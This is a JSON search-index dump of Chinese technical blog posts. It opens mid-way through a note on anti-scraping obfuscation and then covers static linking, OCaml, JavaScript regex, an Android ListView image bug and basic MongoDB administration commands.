例子：全网代理IP 在一些展示代理IP信息的页面，对于IP的保护也是大费周折。 他们会先把IP的数字与符号分割成dom节点，再在中间插入迷惑人的数字，如果爬虫不知道这个策略，还会以为自己成功拿到了数值；不过如果爬虫注意到，就很好解决了。 字符集替换式 例子：去哪儿移动侧 同样会欺骗爬虫的还有去哪儿的移动版。 html里明明写的3211，视觉上展示的却是1233。原来他们重新定义了字符集，3与1的顺序刚好调换得来的结果… 本文链接： http://www.meng.uno/articles/c50121e6/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://www.meng.uno/tags/前端/"},{"name":"安全","slug":"安全","permalink":"http://www.meng.uno/tags/安全/"}]},{"title":"静态链接","slug":"static-lnker","date":"2017-06-11T04:14:23.000Z","updated":"2018-04-10T05:46:42.641Z","comments":true,"path":"articles/41311c08/","link":"","permalink":"http://www.meng.uno/articles/41311c08/","excerpt":"GCC的工作，到生成汇编代码为止。剩下的工作，交给了Binutils来完成：assembler和static linker。linker主要完成的是静态链接，目标文件合并的工作。例如，把多个.o文件合并成一个可执行文件。 两步链接 两步链接指的是： 1. 空间与地址的分配 链接器会首先扫描所有的输入文件，获得各个段的长度、属性和位置，将段合并；并将输入目标文件中的符号表合并为全局符号表。 2. 符号解析与重定位 使用上一步中收集到的信息，进行符号解析和重定位，调整代码中的地址等。这一步也是链接过程的核心，特别是重定位过程。 链接器首先","text":"GCC的工作，到生成汇编代码为止。剩下的工作，交给了Binutils来完成：assembler和static linker。linker主要完成的是静态链接，目标文件合并的工作。例如，把多个.o文件合并成一个可执行文件。 两步链接 两步链接指的是： 空间与地址的分配 链接器会首先扫描所有的输入文件，获得各个段的长度、属性和位置，将段合并；并将输入目标文件中的符号表合并为全局符号表。 符号解析与重定位 使用上一步中收集到的信息，进行符号解析和重定位，调整代码中的地址等。这一步也是链接过程的核心，特别是重定位过程。 链接器首先获取各个段的虚拟地址；在确定段的虚拟地址之后，也就能确定各个符号的虚拟地址了。 重定位与符号解析 在完成空间和地址的分配之后，链接器开始进行符号解析和重定位的过程。在链接之前，各个段中的符号地址，都是以0为基地址的，对于未知的地址，也通通用0进行替代。编译器在编译时，对于不知道的符号地址，全部用一个假值替代，把真正的工作留给链接器去做。 而链接器在分配了虚拟地址之后，就可以修正每一个需要重定位的入口。这个工作是借助于重定位表来实现的。重定位表包括：重定位入口（也就是需要重定位的地方），偏移表示入口在被重定位的段中的位置。 在x86_64下，重定位表的结构也很简单（定义在elf.h当中）： typedef struct{ Elf64_Addr r_offset; Elf64_Xword r_info; }Elf64_Rel; typedef struct{ Elf64_Addr r_offset; Elf64_Xword r_info; ELF64_Sxword r_addend; }Elf64_Rela 这里，r_offset指定应用重定位操作的位置；r_info则指定必须对其进行重定位的符号表索引以及要应用的重定位类型。其低位表示重定位入口的类型；高位表示重定位入口的符号，在符号表中的下标。（不同处理器的格式不一样） 符号解析则是为符号的重定位提供帮助，根据多个目标文件中的符号表，生成全局符号表，找到相应的符号并进行重定位。对于未定义的符号，链接器都应该能在全局符号表中找到，否则就报出符号未定义的错误。 PS：x86_64只使用Elf64_Rela。 指令修正 在x86_64中，call、jmp、mov、lea等指令的寻址方式千差万别。对于重定位来说，修正指令的寻址方式定义在binutils/elfcpp/x86_64.h当中。这其中主要包括：R_X86_64_64和R_X86_64_PC32两种。这是因为X86_64上，相对寻址依然只支持32位（实际上这也很科学；因为一个可执行文件通常不会有4G那么大）。 两种寻址方式的修正方法分别为： 符号地址 + 保存在被修正位置的值和符号地址 + 保存在被修正位置的值 - 被修正的位置相对于段开始的偏移量 源码分析 初始化，parsing command line &amp; script file linker的入口，在ldmain.c当中(通常在链接的时候，通过编译器内部直接进行调用)。首先，linker会调用bfd库，识别二进制文件的格式，生成各个段的描述符，并且转换为canonical form。（例如linker中的符号表识别工作，就是首先由BFD来进行分析和转化，然后linker直接在canonical form上进行操作，再由BFD来进行输出）因此在ldmain.c的main中，首先进行的也是bfd的初始化bfd_init。随后linker进行了一系列的设置，包括路径，回调函数、初始化，加载插件、读取命令、linker script等。 文件和符号的加载 随后，lang_process中，linker会对每个输入文件进行处理。对于每个输入文件，linker都会分配一个bfd，对输入文件进行扫描，识别出其中的符号。首先open_input_bfds为所有文件建立了bfd，随后载入文件中的所有符号。每个符号对应一个bfd_link_hash_entry，它们保存在bfd_link_hash_table当中。 bfd_link_add_symbols将符号添加到hash_table当中。 输入文件的分析和合并 在链接的第一部分完成后，第二部分开始前，链接器首先调用了ldctor_build_sets函数，它主要为C++中的constructor/dectructor提供支持。随后链接器lang_do_memory_region计算出内存区域（它们保存在lang_memory_region_list当中）。再通过lang_common处理全局符号，将它们添加到对应的section，移除没有被使用的sections等。随后链接器建立输入section和输出section之间的映射关系，并且将文件的section合并，以及设置段的属性等。 重定位 第四步是符号的重定位工作。这里lang_size_section首先获取所有section的大小，然后lang_set_startof会修正section的大小和位置。在确定了sections的信息之后，就可以对符号进行重定位了，这便是lang_do_assignments和ldexp_finalize_syms的工作。它们会按照前面提到的方法，对符号进行重定位。最后链接器还会检查符号和section的正确性。 交给bfd，输出文件 在完成重定位之后，如果没有出现异常，linker就把工作交给bfd了。ldwrite负责把链接好的文件输出。完成一些清理工作后，整个链接过程就结束了。 本文链接： http://www.meng.uno/articles/41311c08/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"链接器","slug":"链接器","permalink":"http://www.meng.uno/tags/链接器/"},{"name":"静态链接","slug":"静态链接","permalink":"http://www.meng.uno/tags/静态链接/"}]},{"title":"Ocaml学习","slug":"ocaml","date":"2017-04-10T03:25:39.000Z","updated":"2018-04-10T05:46:42.639Z","comments":true,"path":"articles/b303bc00/","link":"","permalink":"http://www.meng.uno/articles/b303bc00/","excerpt":"网上关于Ocaml的资料比较少，可见它是一门偏小众的语言。不过在DSL和程序分析方面，Ocaml是十分强大的。 函数的定义和调用 Ocaml中，定义函数的语法很简单。这个函数是输入两个浮点数后计算它们的平均值。 let average a b = (a +. b) /. 2.0;; 在C当中，如果要定义一个相同的函数，其定义是这样的： double average(double a, double b){ return (a + b) / 2; } 可以看到，OCaml没有定义a和b的类型，而且也没有所谓的return，而且写的是2.0，没有用隐式转换。这其实是由Ocaml语言","text":"网上关于Ocaml的资料比较少，可见它是一门偏小众的语言。不过在DSL和程序分析方面，Ocaml是十分强大的。 函数的定义和调用 Ocaml中，定义函数的语法很简单。这个函数是输入两个浮点数后计算它们的平均值。 let average a b = (a +. b) /. 2.0;; 在C当中，如果要定义一个相同的函数，其定义是这样的： double average(double a, double b){ return (a + b) / 2; } 可以看到，OCaml没有定义a和b的类型，而且也没有所谓的return，而且写的是2.0，没有用隐式转换。这其实是由Ocaml语言的特性决定的： Ocaml是强静态类型的语言 OCaml使用类型推倒，不需要注明类型 OCaml不做任何隐式转换(所以要写浮点数就必须是2.0) OCaml不允许重载，+.表示两个浮点数相加，也就是说操作符是和类型相关的 OCaml的返回值是最后的表达式，不需要return 和大多数基于C的语言不同，OCaml的函数调用，是没有括号的。例如定义了一个函数repeated，它的参数是一个字符串s和一个数n，那么它的调用形式会是： repeated &quot;hello&quot; 3 (*this is Ocaml code*) 可以看到既没有括号，也没有都好。不过reoeated (&quot;hello&quot;, 3)也是合法的，只不过它的参数是一个含两个元素的对(pair)。 基本类型、转换与推倒 类型 范围 int 32bit:31位;64bit:63位 float 双精度，类似于C中的double bool true/flase char 8bit字符 string 字符串 unit 写作()，类似void 这里，Ocaml内部使用了int中的一位来自动管理内存(垃圾收集)，因此会少一位。 前面也提到，OCaml是没有隐式类型转换的。因此 1 + 2.5;; 1 +. 2.5;; 在OCaml中是会报错的。但是如果一定要让一个整数和浮点数相加，就必须显示的进行转换，比如： float_of_int i +. f;; float i +. f;; 许多情况下，不需要声明函数的变量和类型，因为Ocaml自己会知道，它会一直检查所有的类型匹配。比如前面的average函数，就能够自给判断出这个函数需要两个浮点数参数和返回一个浮点数。 函数的递归和类型 和基于C的语言不同之处在于，OCaml中，函数一般不是递归的，除非用let rec代替let定义递归函数。这是一个递归函数的例子： let rec range a b = if a &gt; b then [] else a :: range (a+1) b let和let rec的唯一区别，就是函数的定义域。举个例子，如果用let定义range，那么range会去找一个已经定义好的函数，而不是它自身。不过在性能上，let和let rec并没有太大的差异。所以即使全部用let rec来定义也可以。 而OCaml的类型推倒，也使得几乎不用显式的写出函数的类型。不过Ocaml经常以这样的实行显示参数和返回值的类型： f:arg1 -&gt; arg2 -&gt; ... -&gt; argn -&gt; rettype f: 'a-&gt;int (*单引号表示人意类型*) 表达式 在Ocaml当中，局部变量/全局变量其实都是一个表达式。例如，局部表达式有： let average a b = let sum = a +. b in sum /. 2.0;; 标准短语let name = expression in是用来定义一个命名的局部表达式的。name在这个函数当中，就可以代替expression，直到一个;;结束这个代码块。这里把let ... in视为一个整体。和C中不一样，OCaml中name只是expression的一个别名，我们是不能给name赋值或者改值的。 而全局表达式，也可以像定义局部变量一样定义全局名，但这些也不是真正的变量，而只是缩略名。 let html = let content = read_whole_file file in GHtml.html_from_string content ;; let menu_bold () = match bold_button#active with | true -&gt; html#set_font_style ~enable:[`BOLD] () | false -&gt; html#set_font_style ~disable:[`BOLD] () ;; let main () = (* code omitted *) factory#add_item &quot;Cut&quot; ~key:_X ~callback: html#cut ;; 这里，html实际上是一个“小部件”，没有指针去保存它的地址，也不能赋值，而是在之后的两个函数中被引用。 Let-绑定 绑定，let ...，能够在OCaml中，实现真正的变量。在OCaml中，引用使用关键字ref来进行定义。例如， let my_ref = ref 0;;(*引用保存着一个整数0*) myref := 100(*引用被赋值为100*) :=用来给引用赋值，而！用来取出引用的值。以下是一个C和OCaml的比较 OCaml C/C++ let my_ref = ref 0;; int a = 0; int *my_ptr = &amp;a; my_ref := 100;; *my_ptr = 100; !my_ref *my_ptr 嵌套函数 与C语言不同的是，OCaml是可以使用嵌套函数的。 let read_whole_channel chan = let buf = Buffer.create 4096 in let rec loop () = let newline = input_line chan in Buffer.add_string buf newline; Buffer.add_char buf '\\n'; loop () in try loop () with End_of_file -&gt; Buffer.contents buf;; 这里，loop是只有一个嵌套函数，在read_whole_channel中，是可以调用loop()的，但它在read_whole_channel当中并没有定义，嵌套函数可以使用主函数当中的变量，它的格式和局部命名表达式是一致的。 模块和OPEN OCaml也提供了很多模块，包括画图、数据结构、处理大数等等。这些库位于usr/lib/ocaml/VERSION。例如一个简单的模块Graphics，如果想使用其中的函数，有两种方法。第一种是在开头声明open Graphics，第二种是在函数调用之前加上前缀，例如Graphics.open_graph。 如果想用 Graphics当中的符号，也可以通过重命名的方式，简化前缀。 module Gr = Graphics;; 这个技巧在模块嵌套时十分有用。 ;;还是;，或者什么都不用？ 在OCaml中，有时候会使用;;，有时候会使用;，有时候却什么都不用，这就让初学者很容易迷惑。这里，OCaml实际上定义了一系列的规则。 #1 必须使用;;在代码的最顶端，来分隔不同语句(不同代码段之间的分隔)，并且不要在函数定义或其他语句中使用 #2 可以在某些时候省略掉;;，包括let，open，type之前，文件的最后，以及OCaml能自动判断的地方 #3 let ... in是一条单独道语句，不能在后面加单独的; #4 所有代码块中其他语句后面，跟上一个单独的;，最后一个例外 看到这些规则，我依然没有完全理解这三者的用法。我想，只有实际接触过Ocaml代码，才能逐渐体会到其中的精髓吧。 模块 OCaml把每一段代码，都包装成一个模块。例如两个文件amodule.ml和bmodule.ml都会定义一个模块，分别为Amodule和Bmodule。 通常模块是一个个编译的，比如 ocamlopt -c amodule.ml ocamlopt -c bmodule.ml ocamlopt -o hello amodule.cmx bmodule.cmx 那么访问模块中的内容可以使用open，也可以使用module.func这样的方式。 通常模块会定义为 struct...end的形式，这样能够形成一个有效的闭包，防止命名的重复等，它需要和一个module关键字绑定。比如： module PrioQueue = struct ... end;; 接口、签名 通常模块中的所有定义，都可以从外部进行访问。但实际中，模块只应该提供一系列接口，隐藏一些内容，这也是面向对象语言中所提倡的。模块是定义在.ml文件中的，而相应的接口，则是从.mli文件中得到的。它包含了一个带有类型的值的表。例如，对于一个模块来说，它的接口可以这样定义： (*模块定义*) let message = &quot;Hello&quot; let hello() = print_endline message (*接口定义*) val hello : uint -&gt; unit 这样，接口的定义就隐藏了message。这里，.mli文件是在.ml文件之前编译的。.mli用ocamlc来编译，而.ml则是用ocamlopt来编译的。.mli文件就是所说的“签名”。 ocamlc -c amodule.mli ocamlopt -c amodule.ml 类型 值可以通过把它们的名字和类型，放到.mli文件的方式来导出。 val hello : unit -&gt; unit 但模块经常定义新的类型。例如， type date = { day : int; month : int; year : int } 这里其实有几种.mli文件的写法，例如，包括： 完全忽略类型 把类型定义拷贝到签名 把类型抽象，只给出名字type date 把域做成只读的:type date = private{...} 如果采用第三种方式，那么模块的用户就只能操作date对象，使用模块提供的函数去间接进行访问。 子模块 一个给定的模块，可以在文件中显示的定义，成为当前模块的字模块。通过约束一个给定自模块的接口，是能够达到和写一对.mli/.ml文件一样的效果的。例如： module type Hello_type = sig val hello : unit -&gt; unit end module Hello : Hello_type = struct ... end 仿函数（函子） OCaml中的仿函数，定义与其他语言不太一样，它是用另一个模块，来参数化的模块。它允许传入一个类型作为参数，但这在OCaml中直接做是不可能的。个人理解，这里的函子和C++中的STL比较类似，它接受不同类型的输入作为初始化。事实上在OCaml中，map和set模块都是要通过函子来使用的。 例如，标准库定义的 Set模块，就提供了一个Make函子。假如要使用不同类型的集合，可以这样这样利用函子： # module Int_set = Set.Make (struct type t = int let compare = compare end) # module String_set = Set.Make (String);; 至于函子的定义，则是这样： module F(X : X_type) = struct ... end X是作为参数被传递的模块，而X_type是它的签名，这种写法是强制。 module F(X:X_type) : Y_type = struct ... end 这种写法对于返回模块的签名，也能够进行约束。函子的操作也是比较难理解的，多使用set/map，并且阅读这两个库中的源码，是能够帮助理解和记忆的。 模式匹配 OCaml能够把数据结构分开，并对其做模式匹配。这里举一个例子，表示一个数学表达式n * (x + y)，并且分解公因式为n * x + n * y 首先定义一个表达式类型： # type expr = | Plus of expr * expr (* means a + b *) | Minus of expr * expr (* means a - b *) | Times of expr * expr (* means a * b *) | Divide of expr * expr (* means a / b *) | Value of string (* &quot;x&quot;, &quot;y&quot;, &quot;n&quot;, etc. *);; 那么，对于一个表达式，用模式匹配的方式，可以将其打印成对应的数学表达式： # let rec to_string e = match e with | Plus (left, right) -&gt; &quot;(&quot; ^ to_string left ^ &quot; + &quot; ^ to_string right ^ &quot;)&quot; | Minus (left, right) -&gt; &quot;(&quot; ^ to_string left ^ &quot; - &quot; ^ to_string right ^ &quot;)&quot; | Times (left, right) -&gt; &quot;(&quot; ^ to_string left ^ &quot; * &quot; ^ to_string right ^ &quot;)&quot; | Divide (left, right) -&gt; &quot;(&quot; ^ to_string left ^ &quot; / &quot; ^ to_string right ^ &quot;)&quot; | Value v -&gt; v;; val to_string : expr -&gt; string = &lt;fun&gt; # let print_expr e = print_endline (to_string e);; val print_expr : expr -&gt; unit = &lt;fun&gt; 这样，使用print_expr，就能够把一个表达式打印成一个数学表达式。那么，模式匹配的通用形式是： match value with | pattern -&gt; result | pattern -&gt; result ... 或者对条件进行进一步的约束 match value with | pattern [ when condition ] -&gt; result | pattern [ when condition ] -&gt; result ... 注意，这里还有一种特殊的模式匹配，| _，它用来匹配剩下的任意情况。 奇奇怪怪的操作符 OCaml中，还有许多有趣的操作符和表达式。在SO上，我也看到了类似的提问： let m = PairsMap.(empty |&gt; add (0,1) &quot;hello&quot; |&gt; add (1,0) &quot;world&quot;) 这里有两个问题。第一个，module.(e)是啥意思？它其实等价于let open Module in e，它相当于一种简写的形式，同样是把module引入当前模块的方式。 第二个 |&gt;表达式是什么意思？其实它是Pervasives中定义的一个操作符，其定义为let (|&gt;) x f = f x。它被称为&quot;reverse application function&quot;（我不知道应该如何翻译），但它的作用，是把连续的调用去有效的串联起来（可以把函数放在参数之后，从而保证一个调用顺序，有一点类似管道的意思）。如果不使用|&gt;符号，那么就必须写成： let m = PairsMap.(add(1,0) &quot;world&quot; (add(0,1) &quot;hello&quot; empty)) 在Uroboros当中，还看到有一个奇怪的操作符，那便是@，从manual上来看，这个操作符的意思是“串联List”。有这样的例子： # List.append [1;2;3] [4;5;6];; - : int list = [1; 2; 3; 4; 5; 6] # [1;2;3] @ [4;5;6];; - : int list = [1; 2; 3; 4; 5; 6] 本文链接： http://www.meng.uno/articles/b303bc00/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Ocaml","slug":"Ocaml","permalink":"http://www.meng.uno/tags/Ocaml/"},{"name":"静态分析","slug":"静态分析","permalink":"http://www.meng.uno/tags/静态分析/"}]},{"title":"正则表达式","slug":"regular-exp","date":"2017-04-04T06:44:58.000Z","updated":"2018-04-04T06:54:08.851Z","comments":true,"path":"articles/2f57a694/","link":"","permalink":"http://www.meng.uno/articles/2f57a694/","excerpt":"正则表达式（英语：Regular Expression，在代码中常简写为regex、regexp或RE）使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式。搜索模式可用于文本搜索和文本替换。 什么是正则表达式？ * 正则表达式是由一个字符序列形成的搜索模式。 * 当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容。 * 正则表达式可以是一个简单的字符，或一个更复杂的模式。 * 正则表达式可用于所有文本搜索和文本替换的操作。 使用字符串方法 在 JavaScript 中，正则表达式通常用于","text":"正则表达式（英语：Regular Expression，在代码中常简写为regex、regexp或RE）使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式。搜索模式可用于文本搜索和文本替换。 什么是正则表达式？ 正则表达式是由一个字符序列形成的搜索模式。 当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容。 正则表达式可以是一个简单的字符，或一个更复杂的模式。 正则表达式可用于所有文本搜索和文本替换的操作。 使用字符串方法 在 JavaScript 中，正则表达式通常用于两个字符串方法 : search() 和 replace()。 search() 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子字符串的起始位置。 replace() 方法用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子字符串。 search() 方法使用正则表达式 使用正则表达式搜索 “w3cschool” 字符串，且不区分大小写： varstr =&quot;Visit w3cschool&quot;; varn = str.search(/w3cschool/i); 输出结果为： 6 replace() 方法使用正则表达式 使用正则表达式且不区分大小写将字符串中的 Microsoft 替换为 w3cschool : varstr =&quot;Visit Microsoft!&quot;; varres = str.replace(/microsoft/i,&quot;w3cschool&quot;); 结果输出为: Visit w3cschool! 正则表达式修饰符 修饰符可以在全局搜索中不区分大小写: 修饰符描述 i 执行对大小写不敏感的匹配。 g 执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。 m 执行多行匹配。 正则表达式模式 方括号用于查找某个范围内的字符： 表达式描述 [abc] 查找方括号之间的任何字符。 [0-9] 查找任何从 0 至 9 的数字。 (x|y) 查找任何以 | 分隔的选项。 元字符是拥有特殊含义的字符 元字符描述 \\s：用于匹配单个空格符，包括tab键和换行符； \\S：用于匹配除单个空格符之外的所有字符； \\d：用于匹配从0到9的数字； \\w：用于匹配字母，数字或下划线字符； \\W：用于匹配所有与\\w不匹配的字符； . ：用于匹配除换行符之外的所有字符。 \\uxxxx 查找以十六进制数 xxxx 规定的 Unicode 字符。 量词 量词描述 n+ 匹配任何包含至少一个n的字符串。 n* 匹配任何包含零个或多个n的字符串。 n? 匹配任何包含零个或一个n的字符串。 使用 RegExp 对象 在 JavaScript 中，RegExp 对象是一个预定义了属性和方法的正则表达式对象。 使用 test() test() 方法是一个正则表达式方法。 test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true，否则返回 false。 以下实例用于搜索字符串中的字符 “e”： 实例 varpatt = /e/; patt.test(&quot;The best things in life are free!&quot;); 字符串中含有 “e”，所以该实例输出为： true 你可以不用设置正则表达式的变量，以上两行代码可以合并为一行： /e/.test(&quot;The best things in life are free!&quot;) 使用 exec() exec() 方法是一个正则表达式方法。 exec() 方法用于检索字符串中的正则表达式的匹配。 该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。 以下实例用于搜索字符串中的字母 “e”: Example 1 /e/.exec(&quot;The best things in life are free!&quot;); 字符串中含有 “e”，所以该实例输出为: e 本文链接： http://www.meng.uno/articles/2f57a694/ 欢迎转载！","categories":[{"name":"Web","slug":"Web","permalink":"http://www.meng.uno/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.meng.uno/tags/Web/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://www.meng.uno/tags/正则表达式/"}]},{"title":"ListView嵌套GridView显示多张图片出现图片重复、错乱、闪烁等问题","slug":"ListView","date":"2017-03-28T16:13:43.000Z","updated":"2018-03-20T10:07:03.296Z","comments":true,"path":"articles/bc099606/","link":"","permalink":"http://www.meng.uno/articles/bc099606/","excerpt":"场景 为了实现一个订单下多个商品同时评价功能，列表分五种状态（非常满意，满意，一般，较差，不满意）展示，用一个listview，item中有一个GridView，GridView中放置最多五张图片；在listview上下滑动时会出现item中的图片重复、错乱、闪烁等问题。 出现错误 先讲我的错误。遇到问题后Google，参考了一些资料，都是提示要在外层listview的adapter上设置setTag(), 然后在内层GridView的adapter上整体和需要标记复用的imageView上setTag()。照此执行了，还是出错；后来在同事指点下，原来外层adapter中设置gridAdap","text":"场景 为了实现一个订单下多个商品同时评价功能，列表分五种状态（非常满意，满意，一般，较差，不满意）展示，用一个listview，item中有一个GridView，GridView中放置最多五张图片；在listview上下滑动时会出现item中的图片重复、错乱、闪烁等问题。 出现错误 先讲我的错误。遇到问题后Google，参考了一些资料，都是提示要在外层listview的adapter上设置setTag(), 然后在内层GridView的adapter上整体和需要标记复用的imageView上setTag()。照此执行了，还是出错；后来在同事指点下，原来外层adapter中设置gridAdapter时只是在没有塞值时gridView.setVisibility(View.GONE)，忘了要在有值的时候gridView.setVisibility(View.VISIBLE)， 所以导致在复用的时候，没有了GridView可复用。 1234567891011121314151617181920212223 //评价照片 String evaluateImgs = item.getEvaluateDescriptionImgs(); MyGridView gridView = vh.getView(R.id.evaluate_image);EvaluationViewGridAdapter gridAdapter; if (!StringUtils.isEmpty(evaluateImgs)) &#123; //这里是否不需要判断包含`,`，`split`方法是否能自动判断，需要验证 if (evaluateImgs.contains(&quot;,&quot;)) &#123; String[] imgs = evaluateImgs.split(&quot;,&quot;); gridAdapter = new EvaluationViewGridAdapter(imgs, mCallback.getContext()); gridView.setAdapter(gridAdapter); //下面这句是我忘了加的 gridView.setVisibility(View.VISIBLE); &#125; else &#123; String[] imgs = new String[]&#123;evaluateImgs&#125;; gridAdapter = new EvaluationViewGridAdapter(imgs, mCallback.getContext()); gridView.setAdapter(gridAdapter); //下面这句是我忘了加的 gridView.setVisibility(View.VISIBLE); &#125; &#125; else &#123; gridView.setAdapter(gridAdapter); gridView.setVisibility(View.GONE); &#125; 教训：这个问题此前已经遇到过，真是不长记性，看来遇到一些常见问题还是要记录下来啊。例如写这个博客。 原因总结 为了提升listview性能，缓存复用了item(某行对应的View)，ListView通过getView()获取每行的item。 滑动过程中，a. 如果某行item已经滑出屏幕，若该item不在缓存内，则put进缓存，否则更新缓存； b. 获取滑入屏幕的行item之前会先判断缓存中是否有可用的item，如果有，做为convertView参数传递给adapter的getView。 行item图片显示重复：指当前行item显示了之前某行item的图片。 行item图片显示错乱：指某行item显示了不属于该行item的图片。 行item图片显示闪烁：上面b的情况，加载缓慢，还没加载完又滑到下一页，下一页某个item又加载出来了，所以导致图片快速覆盖，显示闪烁效果。 解决方法 第一步：ListView Adapter getView写法 12345678910111213141516171819202122232425 @Overridepublic View getView(int position, View convertView, ViewGroup parent) &#123; ViewHolder holder; if (convertView == null) &#123; convertView = inflater.inflate(R.layout.list_item, null); holder = new ViewHolder(); …… convertView.setTag(holder); &#125; else &#123; holder = (ViewHolder)convertView.getTag(); &#125; ... return convertView;&#125; /** * ViewHolder * * @author trinea@trinea.cn 2013-08-01 */private static class ViewHolder &#123; ImageView appIcon; TextView appName; TextView appInfo;&#125; 这里如果写的是convert()方法，则不需要写以上复用，因为父类中会做复用的事。 第二步： GridView gridAdapter getVIew写法 与上面写法类似；不过需要在用到图片的地方进行判断。 1234567891011121314151617181920212223242526272829303132333435363738 @Overridepublic View getView(int position, View convertView, ViewGroup parent) &#123; ViewHolder holder; if (convertView == null) &#123; convertView = inflater.inflate(R.layout.list_item, null); holder = new ViewHolder(); …… convertView.setTag(holder); &#125; else &#123; holder = (ViewHolder)convertView.getTag(); &#125; ... /** * 解决图片重复错乱闪烁的问题，例如 */ //建立一个唯一标示，一般为item的相应String对象 String file = mListResult.get(position).getFile(); ImageAware imageAware =new ImageViewAware(holder.iv,false); //首先得到要设置的GridView holder.iv.setTag(file); //判断tag存在否 if(holder.iv.getTag()!=null&amp;&amp;holder.iv.getTag().equals(file))&#123; imageLoader.displayImage(file,imageAware); &#125; return convertView;&#125; /** * ViewHolder * * @author linking123.github.io 2017-03-29 */private static class ViewHolder &#123; ImageView appIcon; TextView appName; TextView appInfo;&#125; 一般情况下，走完以上两部可解决问题；解决不了的就要仔细检查一下，有没有像我一样的遗漏问题，小心啊，程序员们。 参考 Android ListView滑动过程中图片显示重复错位闪烁问题解决 感谢作者们的无私奉献，如有侵权，立马删除。 本文链接： http://www.meng.uno/articles/bc099606/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"ListView","slug":"ListView","permalink":"http://www.meng.uno/tags/ListView/"},{"name":"GridView","slug":"GridView","permalink":"http://www.meng.uno/tags/GridView/"}]},{"title":"MongDB","slug":"mongdb","date":"2017-03-20T10:34:11.000Z","updated":"2018-03-20T10:39:51.534Z","comments":true,"path":"articles/83c0afa5/","link":"","permalink":"http://www.meng.uno/articles/83c0afa5/","excerpt":"开启服务 1 mongod --dbpath /data/db/ --port 27017 --fork --logpath --config --nohttpinterface * dbpath 数据库目录 (请先创建好，如果不创建，直接运行mongod会报错) * port 端口 * fork 守护进程 * logpath 日志目录 * config 配置文件 * nohttpinterface 关闭大于1000的管理接口 * auth 开启服务器验证 把配置放置在config文件里，增强复用性 1 2 3 4 5 port = 27017 logpath =","text":"开启服务 1 mongod --dbpath /data/db/ --port 27017 --fork --logpath --config --nohttpinterface dbpath 数据库目录 (请先创建好，如果不创建，直接运行mongod会报错) port 端口 fork 守护进程 logpath 日志目录 config 配置文件 nohttpinterface 关闭大于1000的管理接口 auth 开启服务器验证 把配置放置在config文件里，增强复用性 12345 port = 27017logpath = /Users/jan/mongdb.logauth = truefork = truedbpath = /Users/jan/data/db 关闭服务 在mongo环境中关闭 12 use admindb.shutdownServer() 使用 mongod 命令关闭 1 mongod --shutdown --dbpath /database/mongodb/data/ 使用kill命令关闭 给服务器发送一个SIGINT,SIGTERM信号，即 “kill -2 PID,” 或者 “kill -15 PID“ 1234 ps aux | grep mongojan 12899 0.4 0.5 3046076 41216 ?? S 11:44上午 0:00.22 mongod --config ./mongod.configkill -2 12899 非正常关闭mongodb，导致无法启动 删除 /data/db/mongod.locks文件 使用repair 选项修复mongodb./mongod --repair 重启启动mongodb./mongod 认证 在开启MongoDB 服务时不添加任何参数时，可以对数据库任意操作，而且可以远程访问数据库。如果启动的时候指定—auth参数，可以对数据库进行用户验证。 添加帐号 1234 use testdb.addUser(&quot;username&quot;,&quot;password&quot;) //添加db.addUser(&quot;read_only&quot;,&quot;username&quot;,&quot;password&quot;) //添加只能读取权限帐号 更新密码 本质 账户信息存在admin.system.users集合里，存储格式为： 12345 &#123; &quot;user&quot;:&quot;xxxx&quot;, &quot;readOnly&quot;:true, &quot;pwd&quot;:password_hash&#125; 如果想查询数据库先添加一个授权用户 为数据库添加用户 123456789 use admin db.addUser(&quot;root&quot;,&quot;1234&quot;) &gt;&gt; output &gt;&gt; &#123; &quot;user&quot; : &quot;root&quot;, &quot;readOnly&quot; : false, &quot;pwd&quot; : &quot;fa0450e8c3e5fff6005de2f88559c3d9&quot;, &quot;_id&quot; : ObjectId(&quot;53ca83234b763e5d3dbf15c2&quot;) &#125; 使用授权用户链接数据库 123456789 mongo admin -uroot -p1234 db.system.users.find()&gt;&gt; output &gt;&gt; &#123; &quot;_id&quot; : ObjectId(&quot;53ca83234b763e5d3dbf15c2&quot;), &quot;user&quot; : &quot;root&quot;, &quot;readOnly&quot; : false, &quot;pwd&quot; : &quot;fa0450e8c3e5fff6005de2f88559c3d9&quot; &#125; 链接服务 本地链接 1 mongo -uroot -p1234 u 认证用户名 p 认证密码 远程链接 1 mongo -uroot -p1234 ip:port/dbname 导出 &amp; 导入 导出 1234 mongoexport -d templates -c page -o templates.txt//远程导出mongoexport -d templates -c template -h 10.32.84.119:27017 -o templates.txt 更多help 1 mongoexport --help 导入 1 mongoimport -d templates -c template --file template.txt 更多help 1 mongoimport --help remote db 连接远程终端 1 mongo -u admin -p admin 192.168.0.197:27017/templates 更多help 1 mongo -h 本文链接： http://www.meng.uno/articles/83c0afa5/ 